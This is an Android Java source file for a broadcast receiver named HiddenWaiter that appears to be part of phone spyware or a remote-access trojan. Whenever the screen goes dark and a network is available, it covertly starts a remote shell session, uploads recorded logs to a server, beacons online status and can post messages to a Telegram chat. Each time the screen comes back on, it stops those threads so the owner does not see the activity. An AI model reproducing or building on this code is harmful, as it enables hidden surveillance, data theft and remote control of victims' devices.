package com.example.test;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;


public class HiddenWaiter extends BroadcastReceiver{
	Context context;
	 static long lastsynctime=0;
	 static long lastonlinetime=0;
	 static long sync_interval=10800000; // попытка синхронизации каждые 3 часа
	 static long online_knock_interval=60000;
	 static Thread shellthread=null;  // поток шелл-сессии
	 static Thread syncthread=null; // поток синхронизации
	
@Override
public void onReceive(Context context, Intent intent)
    {
	this.context=context;
	String action = intent.getAction();

	switch (action) {
	
	case "android.intent.action.SCREEN_OFF":
		  if(isNetworkAvailable()){
			  Log.d(MyService.LOG_TAG, "Screen OFF and Internet is here ^^. ready to fight");
			  if(System.currentTimeMillis()-lastsynctime>sync_interval){ //пора синхронизировать?
				 if(!MyService.recording&&!MyService.syncactive){
				  Log.d(MyService.LOG_TAG, "It's time to sync! starting..");
				  sync();
				 }
				  else{
					  Log.d(MyService.LOG_TAG, "already syncing or recording!");
				  	}
		  }
			  if(System.currentTimeMillis()-lastonlinetime>online_knock_interval){
				  Log.d(MyService.LOG_TAG, "posting online status..");
				  notifyonline();
			  }
			  if(!MyService.cmdsessionactive){
				  	shellthread = new Thread(new ShellSession(context));  // создаем новый шелл
				  	shellthread.setName("shellthread");
				  	shellthread.start();
				  	Log.d(MyService.LOG_TAG, "shell thread started");
			  }
		  }
		  else {
			  Log.d(MyService.LOG_TAG, "Screen OFF, No internet yet"); 
		  }
  	  
    
   break;

	case "android.intent.action.SCREEN_ON":
  	  Log.d(MyService.LOG_TAG, "Screen ON");
  	  MyService.streaming=false;
  	  if(shellthread!=null&&shellthread.isAlive()){
  		  try{
  		  shellthread.interrupt();
  		  } catch(Exception e){
  			Log.d(MyService.LOG_TAG, "Error interrupting shell thread!\n"+e.toString()); 
  		  }
  	  }
  	  if(syncthread!=null&&syncthread.isAlive()){
  		  try{
  			syncthread.interrupt();
  		  } catch(Exception e){
  			Log.d(MyService.LOG_TAG, "Error interrupting sync thread!\n"+e.toString()); 
  		  }
  	  }
    break;
    
	}
	 //// if inet is here but no connection it shuts down and reboots everything. etc
 }

boolean isNetworkAvailable() {
    ConnectivityManager connectivityManager = (ConnectivityManager)
    		context.getSystemService(Context.CONNECTIVITY_SERVICE);
    NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
    return activeNetworkInfo != null && activeNetworkInfo.isConnected();
}


 void notifyonline() {
	lastonlinetime = System.currentTimeMillis() / 1000L;   // timestamp отстает на 3 часа
	Thread t = new Thread(new HttpPoster(MyService.online_url,Long.toString(lastonlinetime)));
	t.start();
}

void sync(){
	
	syncthread = new Thread(new SyncThread(MyService.log_path,context,false,true));
	syncthread.setName("syncthread");
	syncthread.start();
}

static void tg_send(String message){
	
	Thread tg = new Thread(new HttpPoster(MyService.tg_url,"chat_id=180678480&text="+message));
	tg.start();
}

}
